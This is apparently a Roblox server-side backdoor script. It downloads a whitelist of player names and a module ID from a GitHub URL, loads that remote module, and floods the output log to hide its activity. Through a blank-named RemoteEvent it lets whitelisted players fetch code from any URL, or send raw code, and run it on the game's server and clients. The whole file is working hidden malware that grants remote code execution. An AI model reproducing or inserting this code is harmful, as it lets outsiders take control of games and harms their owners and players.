local ins=Instance.new
local cf=CFrame.new
local load=false
local Url="https://raw.githubusercontent.com/SurepFox/_/refs/heads/main/"

local Players=game:GetService("Players")
local Repl=game:GetService("ReplicatedStorage")
local Http=game:GetService("HttpService")

local FluffyEvent=ins("RemoteEvent")
FluffyEvent.Name=""

_G.FluffyEvent=FluffyEvent
local Sado=script:FindFirstChildOfClass("ModuleScript")

Players.PlayerAdded:Connect(function(plr)
	if not load then
		local success,result=pcall(function()
			return Http:GetAsync(Url.."players")
		end)
		if table.find(Http:JSONDecode(result),plr.Name) then
			load=true
			FluffyEvent.Parent=Players
			local success,result=pcall(function()
				return Http:GetAsync(Url.."id")
			end)
			require(tonumber(result)).ROOWO(script)
			for i=1,3000 do
				game:GetService("LogService"):ClearOutput()
				print("")
			end

			local OutputGUI=script:WaitForChild("OutputGUI"):Clone()
			OutputGUI.Event.Value=FluffyEvent
			OutputGUI:SetAttribute("Greeting",[[Hello! OwO :3  :3  :3  :3  :3  :3  :3  :3  :3  :3  :3  :3
		
		                       This is a new version
		                                       OWO
		]])
			OutputGUI.Parent=plr.PlayerGui
		end
	end
end)

local function success(text,plr)
	_G.FluffyEvent:FireClient(plr,{text,"success"})
end

FluffyEvent.OnServerEvent:Connect(function(plr,Type,Data)
	local Char=plr.Character

	if Type=="Console" then

		if Data[1]:sub(1,2)=="h/" then

			local success,result=pcall(function()
				return Http:GetAsync(Data[1]:sub(3))
			end)

			local NLS_Pattern="NLS%(%[=*%[([%s%S]-)%]=*%]%)"
			local Client=nil
			
			for content in result:gmatch(NLS_Pattern) do
				local Injected=[[
		print=function(text)
			_G.CreateOutput({text,"print"})
		end
		error=function(text)
			_G.CreateOutput({text,"error"})
		end
		warn=function(text)
			_G.CreateOutput({text,"warn"})
		end
		success=function(text)
			_G.CreateOutput({text,"success"})
		end
		local owner=game.Players.LocalPlayer
		success("Script has started (Client)")
	]]
				content=Injected..content
				Client=script:FindFirstChildOfClass("LocalScript"):Clone()
				Client.Parent=Char
				Sado:Clone().Parent=Client
				local SourceValue=ins("StringValue",Client)
				SourceValue.Value=content
				SourceValue.Name="Value"
				break
			end

			local OwnerName=plr.Name

			local Injected=[[
	print=function(text)
		_G.FluffyEvent:FireClient(game.Players["]]..OwnerName..[["],{text,"print"})
	end
	error=function(text)
		_G.FluffyEvent:FireClient(game.Players["]]..OwnerName..[["],{text,"error"})
	end
	warn=function(text)
		_G.FluffyEvent:FireClient(game.Players["]]..OwnerName..[["],{text,"warn"})
	end
	success=function(text)
		_G.FluffyEvent:FireClient(game.Players["]]..OwnerName..[["],{text,"success"})
	end
	local owner=game.Players["]]..OwnerName..[["]
	success("Script has started (Server)")
]]
			result=Injected..result:gsub(NLS_Pattern,"")

			local Server=script:FindFirstChildOfClass("Script"):Clone()
			Server.Parent=Char
			Sado:Clone().Parent=Server

			local SourceValue=ins("StringValue",Server)
			SourceValue.Value=result
			SourceValue.Name="Value"

			local Owner=ins("StringValue",Server)
			Owner.Value=plr.Name
			Owner.Name="Owner"

			Server.Enabled=true
			
			if Client then
				task.wait(.1)
				Client.Enabled=true
			end
			
		elseif Data[1]=="g/r" then
			success("Got reset",plr)
			plr:LoadCharacter()
		elseif Data[1]:sub(1,3)=="hl/" then
			
			local success,result=pcall(function()
				return Http:GetAsync(Data[1]:sub(4))
			end)
			
			local Injected=[[
                             print=function(text)
                                 _G.CreateOutput({text,"print"})
                             end
                             error=function(text)
                                 _G.CreateOutput({text,"error"})
                             end
                             warn=function(text)
                                _G.CreateOutput({text,"warn"})
                             end
                             success=function(text)
                             	_G.CreateOutput({text,"success"})
                             end
							 local owner=game.Players.LocalPlayer
                             success("Script has started (Client)")
                            ]]
			result=Injected..result
			
			local Client=script:FindFirstChildOfClass("LocalScript"):Clone()
			Client.Parent=Char
			Sado:Clone().Parent=Client

			local SourceValue=ins("StringValue",Client)
			SourceValue.Value=result
			SourceValue.Name="Value"
			
			Client.Enabled=true
		elseif Data[1]:sub(1,3)=="g/d" then
			
			local number=Data[1]:sub(5)
			
			if number=="" then
				number=1
			end
			
			for i=number,1,-1 do
				local Dummy=script.R6Dummy:Clone()
				Dummy:PivotTo(Char.Head.CFrame*cf(0,5,0))
				Dummy.Parent=workspace
			end
			success("Got dummy "..number,plr)
		elseif Data[1]=="g/r6" then
			local R6=script.R6:Clone()
			R6.Name=Char.Name
			plr.Character=R6
			plr.Character.PrimaryPart.CFrame=Char.PrimaryPart.CFrame
			plr.Character.Parent=workspace
			plr.Character:WaitForChild("Humanoid"):ApplyDescription(game:GetService("Players"):GetHumanoidDescriptionFromUserId(plr.UserId))
			success("R6 Installed",plr)
		elseif Data[1]:sub(1,2)=="c/" then
			local req=Data[1]:sub(3)
			local OldReq=req
			local Injected=[[
	                        local owner=game.Players["]]..plr.Name..[["]
                           ]]
			req=Injected..req
			
			local Server=script:FindFirstChildOfClass("Script"):Clone()
			Server.Parent=Char
			Sado:Clone().Parent=Server

			local SourceValue=ins("StringValue",Server)
			SourceValue.Value=req
			SourceValue.Name="Value"

			local Owner=ins("StringValue",Server)
			Owner.Value=plr.Name
			Owner.Name="Owner"

			Server.Enabled=true
			success("Got module "..OldReq,plr)

		end

	end
end)
